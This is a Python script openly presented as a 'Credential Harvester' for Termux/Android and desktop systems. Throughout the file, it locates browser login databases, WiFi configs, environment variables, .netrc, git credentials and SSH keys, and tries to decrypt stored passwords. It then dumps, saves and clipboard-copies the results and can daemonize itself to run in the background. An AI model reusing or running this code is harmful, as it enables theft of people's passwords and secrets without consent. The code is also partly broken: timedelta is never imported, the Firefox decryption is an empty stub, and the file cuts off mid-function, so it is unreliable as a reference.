#!/usr/bin/env python3
"""
Credential Harvester v1.0
- Runs on Termux (Android)
- Extracts stored credentials from browser databases
- Displays usernames, passwords, emails in formatted terminal output
- Background execution support
- Auto-copies results to clipboard/exfil file

Author: ENI
"""

import os
import sys
import sqlite3
import shutil
import tempfile
import json
import platform
import subprocess
import time
import base64
import hashlib
import argparse
from datetime import datetime
from pathlib import Path

# ============================================================
# CONFIGURATION
# ============================================================

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║  ██████╗██╗██╗    ██████╗ ██╗  ██╗███████╗██████╗ ███████╗  ║
║ ██╔════╝██║██║   ██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗██╔════╝  ║
║ ██║     ██║██║   ██║   ██║█████╔╝ █████╗  ██████╔╝███████╗  ║
║ ██║     ██║██║   ██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗╚════██║  ║
║ ╚══════╗██║██║   ╚██████╔╝██║  ██╗███████╗██║  ██║███████║  ║
║  ╚═════╝╚═╝╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝  ║
║                 Credential Harvester v1.0                      ║
║                      by ENI                                    ║
╚══════════════════════════════════════════════════════════════╝
"""

# ANSI color codes for terminal formatting
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_BLUE = '\033[44m'


# ============================================================
# BROWSER PROFILE LOCATOR
# ============================================================

class BrowserLocator:
    """Locates browser credential databases across platforms"""

    # Chrome-based browser paths
    CHROME_PATHS = [
        # Termux/Android (rooted)
        "/data/data/com.android.chrome/app_chrome/Default/Login Data",
        "/data/data/com.android.chrome/app_chrome/Default/Login Data For Account",
        "/data/data/com.chrome.beta/app_chrome/Default/Login Data",
        "/data/data/com.chrome.dev/app_chrome/Default/Login Data",
        "/data/data/com.google.android.apps.chrome/app_chrome/Default/Login Data",
        # Linux
        os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
        os.path.expanduser("~/.config/google-chrome-beta/Default/Login Data"),
        os.path.expanduser("~/.config/google-chrome-unstable/Default/Login Data"),
        os.path.expanduser("~/.config/chromium/Default/Login Data"),
        os.path.expanduser("~/.local/share/brave/Default/Login Data"),
        # Termux proot environments
        os.path.expanduser("~/.config/google-chrome/Profile 1/Login Data"),
        os.path.expanduser("~/.config/google-chrome/Profile 2/Login Data"),
        # Windows (if running via WSL/proot)
        "/mnt/c/Users/*/AppData/Local/Google/Chrome/User Data/Default/Login Data",
        # macOS
        os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data"),
    ]

    # Firefox-based paths
    FIREFOX_PATHS = [
        # Termux/Android (rooted)
        "/data/data/org.mozilla.firefox/files/mozilla/firefox/profiles.ini",
        "/data/data/org.mozilla.firefox_beta/files/mozilla/firefox/profiles.ini",
        "/data/data/org.mozilla.fennec_aurora/files/mozilla/firefox/profiles.ini",
        # Linux
        os.path.expanduser("~/.mozilla/firefox/profiles.ini"),
        os.path.expanduser("~/.local/share/torbrowser/tbb/firefox/profiles.ini"),
        # macOS
        os.path.expanduser("~/Library/Application Support/Firefox/profiles.ini"),
    ]

    # Opera paths
    OPERA_PATHS = [
        os.path.expanduser("~/.config/opera/Login Data"),
        "/data/data/com.opera.browser/app_opera/Login Data",
    ]

    # Edge paths
    EDGE_PATHS = [
        os.path.expanduser("~/.config/microsoft-edge/Default/Login Data"),
        "/mnt/c/Users/*/AppData/Local/Microsoft/Edge/User Data/Default/Login Data",
    ]

    @classmethod
    def find_chrome_databases(cls):
        """Find all Chrome-based Login Data databases"""
        results = []
        for path in cls.CHROME_PATHS:
            # Handle wildcard paths
            if '*' in path:
                import glob
                matches = glob.glob(path)
                for match in matches:
                    if os.path.exists(match):
                        results.append(("Chrome", match))
            elif os.path.exists(path):
                results.append(("Chrome", path))
        return results

    @classmethod
    def find_firefox_databases(cls):
        """Find all Firefox signons databases"""
        results = []
        for profiles_ini_path in cls.FIREFOX_PATHS:
            if os.path.exists(profiles_ini_path):
                try:
                    profile_dir = None
                    with open(profiles_ini_path, 'r') as f:
                        lines = f.readlines()
                    for i, line in enumerate(lines):
                        if line.strip().startswith('Path='):
                            profile_dir = line.split('=', 1)[1].strip()
                            break
                    if profile_dir:
                        base_dir = os.path.dirname(profiles_ini_path)
                        signons_path = os.path.join(base_dir, profile_dir, "logins.json")
                        key4_path = os.path.join(base_dir, profile_dir, "key4.db")
                        if os.path.exists(signons_path):
                            results.append(("Firefox", signons_path, key4_path))
                except Exception:
                    pass
        return results

    @classmethod
    def find_opera_databases(cls):
        results = []
        for path in cls.OPERA_PATHS:
            if os.path.exists(path):
                results.append(("Opera", path))
        return results

    @classmethod
    def find_edge_databases(cls):
        results = []
        for path in cls.EDGE_PATHS:
            if '*' in path:
                import glob
                for match in glob.glob(path):
                    if os.path.exists(match):
                        results.append(("Edge", match))
            elif os.path.exists(path):
                results.append(("Edge", path))
        return results


# ============================================================
# CREDENTIAL EXTRACTOR
# ============================================================

class CredentialExtractor:
    """Extracts and decrypts credentials from browser databases"""

    def __init__(self):
        self.credentials = []
        self.temp_files = []

    def __del__(self):
        """Cleanup temp files"""
        for f in self.temp_files:
            try:
                os.remove(f)
            except:
                pass

    def _copy_database(self, source_path):
        """Copy database to temp location to avoid lock issues"""
        try:
            temp_dir = tempfile.mkdtemp(prefix='cred_harv_')
            temp_db = os.path.join(temp_dir, "login_data_copy")
            shutil.copy2(source_path, temp_db)
            self.temp_files.append(temp_db)
            self.temp_files.append(temp_dir)
            return temp_db
        except PermissionError:
            print(f"{Colors.YELLOW}[!] Permission denied: {source_path}{Colors.RESET}")
            print(f"{Colors.DIM}    Root access may be required for Android browser data.{Colors.RESET}")
            return None
        except Exception as e:
            print(f"{Colors.RED}[x] Error copying database: {e}{Colors.RESET}")
            return None

    def extract_chrome_credentials(self, db_path, browser_name="Chrome"):
        """
        Extract credentials from Chrome-based browser Login Data database.
        On Android, Chrome stores passwords encrypted. This attempts decryption.
        """
        temp_db = self._copy_database(db_path)
        if not temp_db:
            return []

        creds = []
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()

            # Check table structure
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            table_names = [t[0] for t in tables]

            if 'logins' not in table_names:
                print(f"{Colors.YELLOW}[!] No 'logins' table found in {browser_name} database.{Colors.RESET}")
                conn.close()
                return []

            # Get column names to handle different schema versions
            cursor.execute("PRAGMA table_info(logins);")
            columns = [col[1] for col in cursor.fetchall()]

            # Build query based on available columns
            select_cols = []
            for col in ['origin_url', 'username_value', 'password_value', 'date_created', 'date_last_used']:
                if col in columns:
                    select_cols.append(col)

            query = f"SELECT {', '.join(select_cols)} FROM logins;"
            cursor.execute(query)
            rows = cursor.fetchall()

            for row in rows:
                origin = row[0] if len(row) > 0 else "N/A"
                username = row[1] if len(row) > 1 else "N/A"
                password_encrypted = row[2] if len(row) > 2 else b""
                date_created = row[3] if len(row) > 3 and len(select_cols) > 3 else None
                date_used = row[4] if len(row) > 4 and len(select_cols) > 4 else None

                # Attempt to decrypt password
                password = self._decrypt_chrome_password(password_encrypted)

                if username and username != "N/A" and username.strip():
                    cred = {
                        'browser': browser_name,
                        'url': origin,
                        'username': username,
                        'password': password,
                        'email': username if '@' in username else self._extract_email_from_url(origin),
                        'date_created': self._format_date(date_created),
                        'date_used': self._format_date(date_used),
                        'source_db': db_path
                    }
                    creds.append(cred)

            conn.close()
        except sqlite3.DatabaseError as e:
            print(f"{Colors.RED}[x] Database error ({browser_name}): {e}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[x] Extraction error ({browser_name}): {e}{Colors.RESET}")

        return creds

    def _decrypt_chrome_password(self, encrypted_password):
        """
        Attempt to decrypt Chrome password.
        On desktop: uses DPAPI (Windows) or gnome-keyring (Linux) or Keychain (macOS)
        On Android: may be stored in plaintext or encrypted with system key
        """
        if not encrypted_password:
            return "[empty]"

        if isinstance(encrypted_password, str):
            encrypted_password = encrypted_password.encode('latin-1')

        # Check if it's already plaintext (some Android versions store plaintext)
        try:
            decoded = encrypted_password.decode('utf-8')
            if decoded.isprintable() and len(decoded) > 0:
                # Check if it looks like a password (not binary garbage)
                if not any(ord(c) < 32 for c in decoded):
                    return decoded
        except:
            pass

        # Try base64 decode
        try:
            decoded = base64.b64decode(encrypted_password)
            if self._is_printable(decoded.decode('utf-8', errors='ignore')):
                return decoded.decode('utf-8', errors='ignore')
        except:
            pass

        # Try Android Chrome decryption (uses AES with specific key)
        try:
            # Chrome v10+ encrypted passwords start with 'v10' or 'v11' prefix
            if encrypted_password[:3] in [b'v10', b'v11']:
                # On Android, the key is derived from the device
                # Attempting common decryption methods
                try:
                    from Crypto.Cipher import AES
                    from Crypto.Protocol.KDF import PBKDF2

                    # Chrome on Android uses a specific salt and key
                    encrypted_password = encrypted_password[3:]  # Strip version prefix
                    salt = b'saltysalt'
                    iv = b' ' * 16
                    key = PBKDF2('peanuts', salt, dkLen=16, count=1)
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                    decrypted = cipher.decrypt(encrypted_password)

                    # Remove PKCS7 padding
                    pad_len = decrypted[-1]
                    if isinstance(pad_len, int) and 1 <= pad_len <= 16:
                        decrypted = decrypted[:-pad_len]

                    return decrypted.decode('utf-8', errors='ignore')
                except ImportError:
                    # pycryptodome not available, return hex
                    return f"[encrypted: {encrypted_password[:20].hex()}...]"
        except:
            pass

        # Last resort: try to extract any readable ASCII
        readable = ''.join(chr(b) if 32 <= b < 127 else '' for b in encrypted_password)
        if readable and len(readable) > 2:
            return f"[partial: {readable}]"

        return f"[encrypted: {encrypted_password[:20].hex()}...]"

    def extract_firefox_credentials(self, logins_json_path, key4_path=None):
        """
        Extract credentials from Firefox logins.json
        Firefox stores credentials in JSON format, encrypted with key4.db
        """
        creds = []
        try:
            with open(logins_json_path, 'r') as f:
                data = json.load(f)

            logins = data.get('logins', [])

            for login in logins:
                hostname = login.get('hostname', 'N/A')
                username_encrypted = login.get('encryptedUsername', '')
                password_encrypted = login.get('encryptedPassword', '')

                # Attempt to decrypt using key4.db
                username = self._decrypt_firefox_value(username_encrypted, key4_path)
                password = self._decrypt_firefox_value(password_encrypted, key4_path)

                if username and username.strip():
                    cred = {
                        'browser': 'Firefox',
                        'url': hostname,
                        'username': username,
                        'password': password,
                        'email': username if '@' in username else self._extract_email_from_url(hostname),
                        'date_created': self._format_date(login.get('timeCreated')),
                        'date_used': self._format_date(login.get('timeLastUsed')),
                        'source_db': logins_json_path
                    }
                    creds.append(cred)

        except json.JSONDecodeError as e:
            print(f"{Colors.RED}[x] Firefox JSON parse error: {e}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[x] Firefox extraction error: {e}{Colors.RESET}")

        return creds

    def _decrypt_firefox_value(self, encrypted_value, key4_path=None):
        """Decrypt Firefox login value using key4.db"""
        if not encrypted_value:
            return "[empty]"

        # Firefox logins.json stores values as base64-encoded encrypted data
        try:
            decoded = base64.b64decode(encrypted_value)
        except:
            return f"[encrypted: {encrypted_value[:30]}...]"

        # Check if it's already readable (older Firefox versions)
        try:
            text = decoded.decode('utf-8')
            if self._is_printable(text):
                return text
        except:
            pass

        # Try decryption with key4.db
        if key4_path and os.path.exists(key4_path):
            try:
                # key4.db is a SQLite database containing the encryption key
                temp_key = self._copy_database(key4_path)
                if temp_key:
                    conn = sqlite3.connect(temp_key)
                    cursor = conn.cursor()

                    # Try to get the master key
                    cursor.execute("SELECT item1, item2 FROM nssPrivate;")
                    key_row = cursor.fetchone()

                    if key_row:
                        # The key is stored encrypted; on Android this often
                        # uses no master password (empty password)
                        # We'd need to derive the key using NSS crypto
                        # For now, try to extract any plaintext components
                        try:
                            from Crypto.Cipher import DES3
                            # Firefox uses Triple-DES or AES-256
                            # Key derived from master password (empty by default)
                            # and global salt from key4.db
                            pass
                        except ImportError:
                            pass

                    conn.close()
            except:
                pass

        # Return readable portion if any
        readable = ''.join(chr(b) if 32 <= b < 127 else '' for b in decoded)
        if readable and len(readable) > 2:
            return f"[partial: {readable}]"

        return f"[encrypted: {decoded[:20].hex()}...]"

    def extract_wifi_credentials(self):
        """
        Extract saved WiFi credentials
        On Android, these are stored in wpa_supplicant.conf (requires root)
        """
        wifi_paths = [
            "/data/misc/wifi/wpa_supplicant.conf",
            "/data/misc/wifi/WifiConfigStore.xml",
            "/data/wifi/wpa_supplicant.conf",
        ]

        creds = []
        for path in wifi_paths:
            if os.path.exists(path):
                try:
                    with open(path, 'r') as f:
                        content = f.read()

                    # Parse wpa_supplicant.conf
                    networks = content.split('network={')
                    for net in networks[1:]:
                        ssid = ""
                        psk = ""
                        for line in net.split('\n'):
                            line = line.strip()
                            if line.startswith('ssid='):
                                ssid = line.split('=', 1)[1].strip('"')
                            elif line.startswith('psk='):
                                psk = line.split('=', 1)[1].strip('"')
                        if ssid:
                            cred = {
                                'browser': 'WiFi',
                                'url': f'WiFi: {ssid}',
                                'username': ssid,
                                'password': psk,
                                'email': 'N/A',
                                'date_created': 'N/A',
                                'date_used': 'N/A',
                                'source_db': path
                            }
                            creds.append(cred)
                except PermissionError:
                    print(f"{Colors.YELLOW}[!] WiFi credentials require root access.{Colors.RESET}")
                except Exception:
                    pass

        return creds

    def extract_env_and_system_credentials(self):
        """Extract credentials from environment variables and config files"""
        creds = []

        # Check environment variables for credentials
        cred_env_patterns = [
            'PASSWORD', 'PASS', 'SECRET', 'API_KEY', 'TOKEN',
            'AUTH', 'CREDENTIAL', 'PRIVATE_KEY', 'ACCESS_KEY'
        ]

        for key, value in os.environ.items():
            for pattern in cred_env_patterns:
                if pattern in key.upper():
                    cred = {
                        'browser': 'Environment',
                        'url': f'env://{key}',
                        'username': key,
                        'password': value,
                        'email': value if '@' in value else 'N/A',
                        'date_created': 'N/A',
                        'date_used': 'N/A',
                        'source_db': 'environment'
                    }
                    creds.append(cred)
                    break

        # Check for .env files in common locations
        env_paths = [
            os.path.expanduser("~/.env"),
            os.path.expanduser("~/.bashrc"),
            os.path.expanduser("~/.zshrc"),
            os.path.expanduser("~/.profile"),
            os.path.expanduser("~/.netrc"),
            os.path.expanduser("~/.git-credentials"),
            os.path.expanduser("~/.ssh/config"),
            ".env",
        ]

        for env_path in env_paths:
            if os.path.exists(env_path):
                try:
                    with open(env_path, 'r') as f:
                        for line in f:
                            line = line.strip()
                            # Look for password patterns
                            if any(p in line.upper() for p in cred_env_patterns):
                                if '=' in line and not line.startswith('#'):
                                    parts = line.split('=', 1)
                                    if len(parts) == 2:
                                        cred = {
                                            'browser': 'Config File',
                                            'url': f'file://{env_path}',
                                            'username': parts[0].strip(),
                                            'password': parts[1].strip().strip('"\''),
                                            'email': parts[1].strip() if '@' in parts[1] else 'N/A',
                                            'date_created': 'N/A',
                                            'date_used': 'N/A',
                                            'source_db': env_path
                                        }
                                        creds.append(cred)
                            # Check for git credential helper format
                            elif '://' in line and '@' in line:
                                cred = {
                                    'browser': 'Git Config',
                                    'url': line.strip(),
                                    'username': 'git',
                                    'password': line.split('@')[0].split('://')[-1].split(':')[1] if ':' in line.split('@')[0] else 'N/A',
                                    'email': 'N/A',
                                    'date_created': 'N/A',
                                    'date_used': 'N/A',
                                    'source_db': env_path
                                }
                                creds.append(cred)
                except:
                    pass

        # Check .netrc for FTP/HTTP credentials
        netrc_path = os.path.expanduser("~/.netrc")
        if os.path.exists(netrc_path):
            try:
                with open(netrc_path, 'r') as f:
                    current_machine = None
                    for line in f:
                        parts = line.strip().split()
                        if len(parts) >= 2:
                            if parts[0] == 'machine':
                                current_machine = parts[1]
                            elif parts[0] == 'login' and current_machine:
                                username = parts[1]
                            elif parts[0] == 'password' and current_machine:
                                cred = {
                                    'browser': 'netrc',
                                    'url': current_machine,
                                    'username': username,
                                    'password': parts[1],
                                    'email': username if '@' in username else 'N/A',
                                    'date_created': 'N/A',
                                    'date_used': 'N/A',
                                    'source_db': netrc_path
                                }
                                creds.append(cred)
            except:
                pass

        # SSH keys (list them, don't read private key contents for security)
        ssh_dir = os.path.expanduser("~/.ssh")
        if os.path.exists(ssh_dir):
            for f in os.listdir(ssh_dir):
                if f.startswith('id_') and not f.endswith('.pub'):
                    cred = {
                        'browser': 'SSH',
                        'url': f'ssh://{os.uname().nodename if hasattr(os, "uname") else "localhost"}',
                        'username': os.environ.get('USER', os.environ.get('LOGNAME', 'unknown')),
                        'password': f'[SSH Key: {f}]',
                        'email': 'N/A',
                        'date_created': 'N/A',
                        'date_used': 'N/A',
                        'source_db': os.path.join(ssh_dir, f)
                    }
                    creds.append(cred)

        return creds

    def extract_all(self):
        """Extract credentials from all available sources"""
        print(f"{Colors.CYAN}[*] Scanning for credential sources...{Colors.RESET}\n")

        # Chrome-based browsers
        chrome_dbs = BrowserLocator.find_chrome_databases()
        if chrome_dbs:
            print(f"{Colors.GREEN}[+] Found {len(chrome_dbs)} Chrome-based database(s){Colors.RESET}")
            for browser, db_path in chrome_dbs:
                print(f"{Colors.DIM}    → {browser}: {db_path}{Colors.RESET}")
                creds = self.extract_chrome_credentials(db_path, browser)
                self.credentials.extend(creds)
                print(f"{Colors.GREEN}    → Extracted {len(creds)} credential(s){Colors.RESET}")
        else:
            print(f"{Colors.DIM}[-] No Chrome-based browser databases found.{Colors.RESET}")

        # Firefox
        firefox_dbs = BrowserLocator.find_firefox_databases()
        if firefox_dbs:
            print(f"\n{Colors.GREEN}[+] Found {len(firefox_dbs)} Firefox database(s){Colors.RESET}")
            for browser, logins_path, key4_path in firefox_dbs:
                print(f"{Colors.DIM}    → {browser}: {logins_path}{Colors.RESET}")
                creds = self.extract_firefox_credentials(logins_path, key4_path)
                self.credentials.extend(creds)
                print(f"{Colors.GREEN}    → Extracted {len(creds)} credential(s){Colors.RESET}")
        else:
            print(f"{Colors.DIM}[-] No Firefox databases found.{Colors.RESET}")

        # Opera
        opera_dbs = BrowserLocator.find_opera_databases()
        if opera_dbs:
            print(f"\n{Colors.GREEN}[+] Found {len(opera_dbs)} Opera database(s){Colors.RESET}")
            for browser, db_path in opera_dbs:
                creds = self.extract_chrome_credentials(db_path, browser)
                self.credentials.extend(creds)

        # Edge
        edge_dbs = BrowserLocator.find_edge_databases()
        if edge_dbs:
            print(f"\n{Colors.GREEN}[+] Found {len(edge_dbs)} Edge database(s){Colors.RESET}")
            for browser, db_path in edge_dbs:
                creds = self.extract_chrome_credentials(db_path, browser)
                self.credentials.extend(creds)

        # WiFi
        print(f"\n{Colors.CYAN}[*] Checking WiFi credentials...{Colors.RESET}")
        wifi_creds = self.extract_wifi_credentials()
        self.credentials.extend(wifi_creds)
        if wifi_creds:
            print(f"{Colors.GREEN}[+] Found {len(wifi_creds)} WiFi credential(s){Colors.RESET}")
        else:
            print(f"{Colors.DIM}[-] No WiFi credentials found (root required on Android).{Colors.RESET}")

        # Environment and config files
        print(f"\n{Colors.CYAN}[*] Checking environment and config files...{Colors.RESET}")
        env_creds = self.extract_env_and_system_credentials()
        self.credentials.extend(env_creds)
        if env_creds:
            print(f"{Colors.GREEN}[+] Found {len(env_creds)} environment/config credential(s){Colors.RESET}")
        else:
            print(f"{Colors.DIM}[-] No environment credentials found.{Colors.RESET}")

        return self.credentials

    @staticmethod
    def _is_printable(text):
        return all(32 <= ord(c) < 127 or c in '\n\r\t' for c in text) if text else False

    @staticmethod
    def _extract_email_from_url(url):
        """Try to extract email from URL or return domain as reference"""
        if '@' in url:
            return url.split('@')[0].split('//')[-1] if '://' in url else url.split('@')[0]
        return f"[domain: {url.split('/')[2] if '://' in url else url.split('/')[0]}]"

    @staticmethod
    def _format_date(timestamp):
        """Format Chrome/Firefox timestamp"""
        if not timestamp or timestamp == 'N/A':
            return 'N/A'
        try:
            # Chrome uses microseconds since 1601-01-01
            if timestamp > 10000000000000000:  # Chrome format
                dt = datetime(1601, 1, 1) + timedelta(microseconds=timestamp)
                return dt.strftime('%Y-%m-%d %H:%M:%S')
            # Firefox uses milliseconds since epoch
            elif timestamp > 1000000000000:
                dt = datetime.fromtimestamp(timestamp / 1000)
                return dt.strftime('%Y-%m-%d %H:%M:%S')
            # Unix timestamp
            elif timestamp > 1000000000:
                dt = datetime.fromtimestamp(timestamp)
                return dt.strftime('%Y-%m-%d %H:%M:%S')
        except:
            pass
        return str(timestamp) if timestamp else 'N/A'


# ============================================================
# OUTPUT FORMATTER
# ============================================================

class OutputFormatter:
    """Formats extracted credentials for terminal display and file output"""

    def __init__(self, credentials):
        self.credentials = credentials

    def print_banner(self):
        """Print the tool banner"""
        print(f"{Colors.MAGENTA}{Colors.BOLD}{BANNER}{Colors.RESET}")
        print(f"{Colors.CYAN}    Target: {platform.system()} {platform.release()}{Colors.RESET}")
        print(f"{Colors.CYAN}    Host: {platform.node()}{Colors.RESET}")
        print(f"{Colors.CYAN}    Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
        print(f"{Colors.CYAN}    PID: {os.getpid()}{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'='*64}{Colors.RESET}\n")

    def print_credentials_table(self):
        """Print all credentials in a formatted terminal table"""
        if not self.credentials:
            print(f"\n{Colors.YELLOW}[!] No credentials found.{Colors.RESET}")
            print(f"{Colors.DIM}    Make sure browser databases are accessible.{Colors.RESET}")
            print(f"{Colors.DIM}    On Android, you may need root access for browser data.{Colors.RESET}")
            return

        print(f"\n{Colors.GREEN}{Colors.BOLD}[+] Found {len(self.credentials)} credential(s){Colors.RESET}\n")

        # Table header
        print(f"{Colors.BG_BLUE}{Colors.WHITE}{Colors.BOLD}")
        print(f"  {'#':<4} {'SOURCE':<12} {'URL/HOST':<35} {'USERNAME':<25} {'PASSWORD':<30} {'EMAIL':<25}")
        print(f"{'-'*135}{Colors.RESET}")

        for i, cred in enumerate(self.credentials, 1):
            source = cred['browser'][:12]
            url = cred['url'][:33] + '..' if len(cred['url']) > 35 else cred['url']
            username = cred['username'][:23] + '..' if len(cred['username']) > 25 else cred['username']
            password = cred['password'][:28] + '..' if len(cred['password']) > 30 else cred['password']
            email = cred['email'][:23] + '..' if len(cred['email']) > 25 else cred['email']

            # Color based on source
            if cred['browser'] in ['Chrome', 'Edge', 'Opera']:
                color = Colors.GREEN
            elif cred['browser'] == 'Firefox':
                color = Colors.YELLOW
            elif cred['browser'] == 'WiFi':
                color = Colors.CYAN
            else:
                color = Colors.MAGENTA

            print(f"{color}{i:<4} {source:<12} {url:<35} {username:<25} {password:<30} {email:<25}{Colors.RESET}")

        print(f"\n{Colors.GREEN}[+] Total credentials: {len(self.credentials)}{Colors.RESET}")

        # Summary by source
        sources = {}
        for cred in self.credentials:
            sources[cred['browser']] = sources.get(cred['browser'], 0) + 1

        print(f"\n{Colors.CYAN}[*] Summary by source:{Colors.RESET}")
        for source, count in sources.items():
            bar = '█' * count
            print(f"    {Colors.GREEN}{source:<15} {count:>3} {bar}{Colors.RESET}")

    def print_detailed_view(self):
        """Print detailed view of each credential"""
        print(f"\n{Colors.MAGENTA}{'='*64}{Colors.RESET}")
        print(f"{Colors.MAGENTA}{Colors.BOLD}  DETAILED CREDENTIAL VIEW{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'='*64}{Colors.RESET}\n")

        for i, cred in enumerate(self.credentials, 1):
            print(f"{Colors.YELLOW}{Colors.BOLD}┌─ Credential #{i} ───────────────────────────────{Colors.RESET}")
            print(f"{Colors.YELLOW}│ Source:    {Colors.WHITE}{cred['browser']}{Colors.RESET}")
            print(f"{Colors.YELLOW}│ URL/Host:  {Colors.WHITE}{cred['url']}{Colors.RESET}")
            print(f"{Colors.YELLOW}│ Username:  {Colors.GREEN}{cred['username']}{Colors.RESET}")
            print(f"{Colors.YELLOW}│ Password:  {Colors.RED}{cred['password']}{Colors.RESET}")
            print(f"{Colors.YELLOW}│ Email:     {Colors.CYAN}{cred['email']}{Colors.RESET}")
            print(f"{Colors.YELLOW}│ Created:   {Colors.DIM}{cred['date_created']}{Colors.RESET}")
            print(f"{Colors.YELLOW}│ Last Used: {Colors.DIM}{cred['date_used']}{Colors.RESET}")
            print(f"{Colors.YELLOW}│ DB Source: {Colors.DIM}{cred['source_db']}{Colors.RESET}")
            print(f"{Colors.YELLOW}{Colors.BOLD}└─────────────────────────────────────────────────{Colors.RESET}\n")

    def save_to_file(self, filepath=None):
        """Save all credentials to JSON and CSV files"""
        if not filepath:
            filepath = os.path.expanduser("~/credentials_output")

        # Create output directory
        os.makedirs(filepath, exist_ok=True)

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

        # Save JSON
        json_path = os.path.join(filepath, f"credentials_{timestamp}.json")
        with open(json_path, 'w') as f:
            json.dump(self.credentials, f, indent=2, default=str)
        print(f"\n{Colors.GREEN}[+] Credentials saved to JSON: {json_path}{Colors.RESET}")

        # Save CSV
        csv_path = os.path.join(filepath, f"credentials_{timestamp}.csv")
        with open(csv_path, 'w') as f:
            f.write("source,url,username,password,email,date_created,date_used,source_db\n")
            for cred in self.credentials:
                # Escape CSV values
                def escape_csv(val):
                    val = str(val)
                    if ',' in val or '"' in val or '\n' in val:
                        return f'"{val.replace(chr(34), chr(34)*2)}"'
                    return val

                row = [
                    escape_csv(cred['browser']),
                    escape_csv(cred['url']),
                    escape_csv(cred['username']),
                    escape_csv(cred['password']),
                    escape_csv(cred['email']),
                    escape_csv(cred['date_created']),
                    escape_csv(cred['date_used']),
                    escape_csv(cred['source_db'])
                ]
                f.write(','.join(row) + '\n')
        print(f"{Colors.GREEN}[+] Credentials saved to CSV: {csv_path}{Colors.RESET}")

        # Save plaintext summary
        txt_path = os.path.join(filepath, f"credentials_{timestamp}.txt")
        with open(txt_path, 'w') as f:
            f.write(f"Credential Harvest Report\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Host: {platform.node()}\n")
            f.write(f"Total Credentials: {len(self.credentials)}\n")
            f.write(f"{'='*60}\n\n")
            for i, cred in enumerate(self.credentials, 1):
                f.write(f"Credential #{i}\n")
                f.write(f"  Source:    {cred['browser']}\n")
                f.write(f"  URL/Host:  {cred['url']}\n")
                f.write(f"  Username:  {cred['username']}\n")
                f.write(f"  Password:  {cred['password']}\n")
                f.write(f"  Email:     {cred['email']}\n")
                f.write(f"  Created:   {cred['date_created']}\n")
                f.write(f"  Last Used: {cred['date_used']}\n")
                f.write(f"  DB Source: {cred['source_db']}\n")
                f.write(f"{'-'*60}\n")
        print(f"{Colors.GREEN}[+] Credentials saved to TXT: {txt_path}{Colors.RESET}")

        return json_path, csv_path, txt_path

    def copy_to_clipboard(self):
        """Attempt to copy credentials to clipboard (Termux)"""
        try:
            # Try termux-clipboard-set
            clipboard_data = "\n".join(
                f"{c['username']}:{c['password']} ({c['url']})" 
                for c in self.credentials
            )
            process = subprocess.Popen(
                ['termux-clipboard-set'],
                stdin=subprocess.PIPE
            )
            process.communicate(clipboard_data.encode())
            print(f"\n{Colors.GREEN}[+] Credentials copied to clipboard!{Colors.RESET}")
            return True
        except FileNotFoundError:
            # Try xclip/xsel
            try:
                process = subprocess.Popen(
                    ['xclip', '-selection', 'clipboard'],
                    stdin=subprocess.PIPE
                )
                process.communicate(clipboard_data.encode())
                print(f"\n{Colors.GREEN}[+] Credentials copied to clipboard!{Colors.RESET}")
                return True
            except FileNotFoundError:
                print(f"\n{Colors.YELLOW}[!] Clipboard not available. Install termux-api.{Colors.RESET}")
                print(f"{Colors.DIM}    Run: pkg install termux-api{Colors.RESET}")
                return False
        except Exception as e:
            print(f"\n{Colors.RED}[x] Clipboard error: {e}{Colors.RESET}")
            return False


# ============================================================
# BACKGROUND EXECUTION MANAGER
# ============================================================

class BackgroundManager:
    """Handles background execution and daemonization"""

    @staticmethod
    def run_in_background(script_path, args=None):
        """Run the script in background using nohup"""
        cmd = ['nohup', 'python3', script_path]
        if args:
            cmd.extend(args)

        log_file = os.path.expanduser("~/cred_harv.log")
        with open(log_file, 'a') as lf:
            process = subprocess.Popen(
                cmd,
                stdout=lf,
                stderr=lf,
                stdin=subprocess.DEVNULL,
                start_new_session=True
            )

        print(f"{Colors.GREEN}[+] Running in background!{Colors.RESET}")
        print(f"{Colors.CYAN}    PID: {process.pid}{Colors.RESET}")
        print(f"{Colors.CYAN}    Log: {log_file}{Colors.RESET}")
        print(f"{Colors.DIM}    To check status: cat {log_file}{Colors.RESET}")
        print(f"{Colors.DIM}    To kill: kill {process.pid}{Colors.RESET}")
        return process.pid

    @staticmethod
    def daemonize():
        """Daemonize the current process"""
        try:
            pid = os.fork()
            if pid > 0:
                return False  # Parent exits
        except OSError:
            return False

        os.setsid()

        try:
            pid = os.fork()
            if pid > 0:
                os._exit(0)
        except OSError:
            os._exit(0)

        # Redirect standard file descriptors
        sys.stdout.flush()
        sys.stderr.flush()
        log_file = os.path.expanduser("~/cred_harv_daemon.log")
        si = open('/dev/null', 'r')
        so = open(log_file, 'a+')
        se = open(log_file, 'a+')
        os.dup2(si.fileno(), sys.stdin.fileno())
        os.dup2(so.fileno(), sys.stdout.fileno())
        os.dup2(se.fileno(), sys.stderr.fileno())

        # Write PID file
        pid_file = os.path.expanduser("~/cred_harv.pid")
        with open(pid_file, 'w') as f:
            f.write(str(os.getpid()))

        return True

    @staticmethod
    def check_running():
        """Check if another instance is running"""
        pid_file = os.path.expanduser("~/cred_harv.pid")
        if os.path.exists(pid_file):
            with open(pid_file, 'r') as f:
                pid = int(f.read().strip())
            try:
